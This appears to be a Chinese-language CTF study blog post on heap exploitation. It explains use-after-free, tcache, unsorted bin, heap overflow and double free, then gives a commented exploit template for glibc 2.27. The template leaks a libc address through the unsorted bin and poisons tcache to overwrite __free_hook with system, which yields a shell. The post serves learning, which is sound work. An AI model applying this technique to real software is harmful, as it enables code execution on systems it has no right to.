---
title: pwn学习记录（其七）
tags:
  - CTF
  - pwn
date: 2025-12-6
categories:
  - CTF
abbrlink: e04c41db
---
# heap初探 ​ ​   
## 核心概念 ​ ​   ​ 
* ​UAF（Use After Free） ​ 	 
当一块内存（chunk）被free回堆管理器器，里面的指针没有被置空，就可以通过这个指针读出或写入内容
当内存被复用时，可以利用悬空指针读取数据
当内存空闲时，可以利用悬空指针修改向前指针，劫持分配流 ​ ​   ​ 
* ​Tcache ​ 	 
当释放一个堆块时,会优先放入Tcache中
当修改空闲块的前8个字节时，就能将写入下一次申请内存时分配的地址
* Unsorted Bin
当Tcache被填满时，后续释放的堆块会进入Unsorted Bin
进入这里的第一个堆块，向前和向后指针会指向libc内部地址，进而算出libc基址
* Heap Overflow
往堆块中写入数据时超过了申请的大小，覆盖了下一个堆块的header，就可以修改下一个堆块的大小导致堆重叠，或者将下一个堆块的P位改为0，就可以合并chunk
* Double Free
释放两次同一个指针，实现A->B->A，申请A时，修改内容，B的向前指针也会被修改，实现任意地址分配。
## 具体代码讲解
* step 1 通过UAF泄露libc基址

    # 小于 0x410 的 chunk 释放后先进入 Tcache (每种大小最多 7 个)。
    # Tcache 满了之后，再释放才会进入 Unsorted Bin。
    # Unsorted Bin 里的 chunk 会包含指向 libc (main_arena) 的指针。
    # 申请 9 个 chunk (0-8)
    # 0-6: 用来填满 Tcache
    # 7: 用来进 Unsorted Bin 泄露地址
    # 8: 防止 chunk 7 释放时与 Top Chunk 合并
    for i in range(9):
        add(i, 0x90) # size 0x90 (144)
    # 释放前 7 个，填满 Tcache list
    for i in range(7):
        delete(i)
    # 释放第 8 个 (idx 7)，Tcache 满了，被迫进入 Unsorted Bin
    delete(7)
    # 利用 UAF (Use After Free) 漏洞
    # 虽然 delete 了，但指针还在数组里，show(7) 可以打印被释放块的内容，就可以获取libc内部地址进而计算libc基址
    show(7)
    # 具体如何申请，释放和打印与具体题目有关
* step 2 劫持__free_hook

    # 此时 0x90 的 Tcache 是满的，我们换个大小 (0x60) 进行攻击，比较干净
    # 申请一个新的 chunk 9
    add(9, 0x60)
    # 释放它，让它进入 Tcache (0x70 bin) 的链表头部
    delete(9)
    # 利用 UAF 修改 fd 指针
    # Glibc 2.27 Tcache 不检查 fd 指向哪里，我们直接指向 __free_hook
    edit(9, p64(free_hook))
    # 现在的 Tcache 链表: [Chunk 9] -> [__free_hook]
    # 第一次申请，把 Chunk 9 取出来
    add(10, 0x60)
    # 第二次申请，拿到的就是我们伪造的地址 (__free_hook)
    add(11, 0x60)
* step 3 获取shell

    # 此时 chunk 11 对应的内存就是 __free_hook
    # 此时 chunk 10 是一个普通的堆块，我们拥有它的读写权
    # 1. 往 chunk 10 里写入 "/bin/sh\x00"
    edit(10, b"/bin/sh\x00")   
    # 2. 往 chunk 11 (__free_hook) 里写入 system 函数的地址
    edit(11, p64(system_addr))
    # 3. 触发 Shell
    # 原理：调用 free(10) 时，系统会检查 __free_hook。
    # 发现 hook 被改成了 system，于是执行 system(chunk10的内容)
    # 等价于 system("/bin/sh")
    delete(10)